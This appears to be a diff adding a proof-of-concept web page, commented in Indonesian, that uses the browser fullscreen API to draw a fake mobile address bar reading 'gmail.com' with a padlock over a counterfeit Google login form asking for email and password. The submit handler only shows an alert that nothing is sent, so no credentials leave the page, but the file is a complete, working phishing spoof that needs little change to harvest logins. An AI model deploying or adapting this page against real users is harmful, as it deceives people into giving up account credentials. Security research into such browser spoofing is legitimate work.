@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PoC Fullscreen - Gmail Spoof</title>
+    <style>
+        /* Reset & Tema Gelap */
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Roboto', Arial, sans-serif; 
+            background-color: #121212; 
+            color: #e0e0e0; 
+            overflow: hidden; /* Mencegah scroll saat overlay muncul */
+        }
+
+        /* =========================================
+           OVERLAY PEMBUKA (Menutupi seluruh layar)
+           ========================================= */
+        #overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #121212;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 999999; /* Paling atas */
+            cursor: pointer;
+        }
+
+        #overlay p {
+            font-size: 18px;
+            color: #8ab4f8;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* =========================================
+           FAKE ADDRESS BAR
+           ========================================= */
+        #fakeAddressBar {
+            display: none; 
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            height: 56px; 
+            background-color: #1f1f1f; 
+            align-items: center;
+            padding: 0 12px;
+            z-index: 99999; 
+            box-sizing: border-box;
+            border-bottom: 1px solid #333;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        /* Ikon Home */
+        .icon-home {
+            width: 24px; height: 24px;
+            fill: #e0e0e0;
+            margin-right: 12px;
+        }
+
+        /* Kotak URL */
+        .url-box {
+            flex-grow: 1;
+            background-color: #2a2a2a;
+            border-radius: 20px;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            margin-right: 12px;
+            overflow: hidden;
+        }
+
+        .lock-icon {
+            color: #4caf50; 
+            font-size: 14px;
+            margin-right: 8px;
+        }
+
+        .url-text {
+            font-size: 14px;
+            color: #e0e0e0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            flex-grow: 1;
+        }
+
+        .refresh-icon {
+            color: #9aa0a6;
+            font-size: 16px;
+            margin-left: 8px;
+        }
+
+        /* Ikon Sisi Kanan */
+        .right-icons {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .icon-plus { font-size: 24px; color: #e0e0e0; }
+        .tab-counter {
+            font-size: 12px; border: 2px solid #e0e0e0; border-radius: 6px;
+            width: 18px; height: 18px; display: flex; align-items: center;
+            justify-content: center; font-weight: bold;
+        }
+        .icon-menu { font-size: 20px; color: #e0e0e0; font-weight: bold; }
+
+        /* =========================================
+           KONTEN PALSU (Gmail Login)
+           ========================================= */
+        #fakeContent {
+            display: none;
+            padding: 80px 24px 20px 24px; 
+            overflow-y: auto;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .google-logo {
+            font-size: 32px; font-weight: bold;
+            background: -webkit-linear-gradient(45deg, #4285F4, #EA4335, #FBBC05, #34A853);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+        }
+
+        .login-title { font-size: 28px; font-weight: 400; margin: 0 0 16px 0; }
+        .login-subtitle { font-size: 16px; color: #bdc1c6; margin-bottom: 32px; }
+
+        .input-group { position: relative; margin-bottom: 24px; }
+        .input-group input {
+            width: 100%; background: transparent; border: 1px solid #5f6368;
+            color: #fff; padding: 16px; border-radius: 4px; font-size: 16px;
+            box-sizing: border-box;
+        }
+        .input-group input:focus {
+            outline: none; border-color: #8ab4f8; border-width: 2px; padding: 15px;
+        }
+        .input-group label {
+            position: absolute; top: -10px; left: 12px; background-color: #121212;
+            padding: 0 4px; font-size: 12px; color: #8ab4f8;
+        }
+
+        .checkbox-group {
+            display: flex; align-items: center; margin-bottom: 32px;
+            font-size: 14px; color: #bdc1c6;
+        }
+        .checkbox-group input { margin-right: 8px; accent-color: #8ab4f8; }
+
+        .action-buttons { display: flex; justify-content: space-between; align-items: center; }
+        .btn-create {
+            color: #8ab4f8; font-size: 14px; font-weight: 500;
+            background: none; border: none; padding: 0; cursor: pointer;
+        }
+        .btn-next {
+            background-color: #8ab4f8; color: #202124; border: none;
+            padding: 12px 24px; border-radius: 4px; font-size: 14px;
+            font-weight: 500; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- =========================================
+         OVERLAY PEMBUKA (Klik untuk Fullscreen)
+         ========================================= -->
+    <div id="overlay">
+        <p>Ketuk di mana saja untuk melanjutkan...</p>
+    </div>
+
+    <!-- =========================================
+         FAKE ADDRESS BAR (Teks: gmail.com)
+         ========================================= -->
+    <div id="fakeAddressBar">
+        <svg class="icon-home" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+        <div class="url-box">
+            <span class="lock-icon">🔒</span>
+            <span class="url-text">gmail.com</span>
+            <span class="refresh-icon">↻</span>
+        </div>
+        <div class="right-icons">
+            <span class="icon-plus">+</span>
+            <div class="tab-counter">2</div>
+            <span class="icon-menu">⋮</span>
+        </div>
+    </div>
+
+    <!-- =========================================
+         KONTEN PALSU (Gmail Login Form)
+         ========================================= -->
+    <div id="fakeContent">
+        <div class="google-logo">G</div>
+        <h1 class="login-title">Login</h1>
+        <p class="login-subtitle">Gunakan Akun Google Anda</p>
+
+        <form onsubmit="event.preventDefault(); alert('PoC: Data tidak dikirim ke mana pun. Ini hanya simulasi.');">
+            <div class="input-group">
+                <label>Email atau nomor telepon</label>
+                <input type="text" placeholder="" required>
+            </div>
+
+            <div class="input-group">
+                <label>Masukkan sandi Anda</label>
+                <input type="password" id="passwordInput" placeholder="" required>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="showPass">
+                <label for="showPass">Tampilkan sandi</label>
+            </div>
+
+            <div class="action-buttons">
+                <button type="button" class="btn-create">Buat akun</button>
+                <button type="submit" class="btn-next">Berikutnya</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- =========================================
+         JAVASCRIPT
+         ========================================= -->
+    <script>
+        // Fungsi untuk memicu fullscreen dan menampilkan spoof
+        function triggerSpoof() {
+            // 1. Masuk ke Mode Fullscreen
+            const docEl = document.documentElement;
+            if (docEl.requestFullscreen) {
+                docEl.requestFullscreen().then(() => {
+                    // Jika berhasil, sembunyikan overlay dan tampilkan UI palsu
+                    showFakeUI();
+                }).catch(err => {
+                    console.log("Gagal fullscreen:", err);
+                    // Tetap tampilkan UI palsu meskipun fullscreen gagal (fallback)
+                    showFakeUI();
+                });
+            } else if (docEl.webkitRequestFullscreen) { 
+                docEl.webkitRequestFullscreen();
+                showFakeUI();
+            } else {
+                // Fallback jika browser tidak mendukung fullscreen
+                showFakeUI();
+            }
+        }
+
+        // Fungsi untuk menampilkan UI palsu
+        function showFakeUI() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('fakeAddressBar').style.display = 'flex';
+            document.getElementById('fakeContent').style.display = 'block';
+        }
+
+        // Event Listener: Mendeteksi sentuhan/klik pertama di mana saja
+        // Menggunakan { once: true } agar hanya berjalan satu kali
+        document.body.addEventListener('click', triggerSpoof, { once: true });
+        document.body.addEventListener('touchstart', triggerSpoof, { once: true });
+
+        // Fitur "Tampilkan sandi"
+        document.getElementById('showPass')?.addEventListener('change', function() {
+            const passInput = document.getElementById('passwordInput');
+            if (passInput) {
+                passInput.type = this.checked ? 'text' : 'password';
+            }
+        });
+
+        // Fitur Testing: Keluar dari fullscreen saat layar disentuh dua kali
+        document.addEventListener('dblclick', function() {
+            if (document.fullscreenElement) {
+                document.exitFullscreen();
+                // Kembalikan overlay untuk testing ulang
+                document.getElementById('overlay').style.display = 'flex';
+                document.getElementById('fakeAddressBar').style.display = 'none';
+                document.getElementById('fakeContent').style.display = 'none';
+                // Reset event listener
+                document.body.addEventListener('click', triggerSpoof, { once: true });
+                document.body.addEventListener('touchstart', triggerSpoof, { once: true });
+            }
+        });
+    </script>
+</body>
+</html>
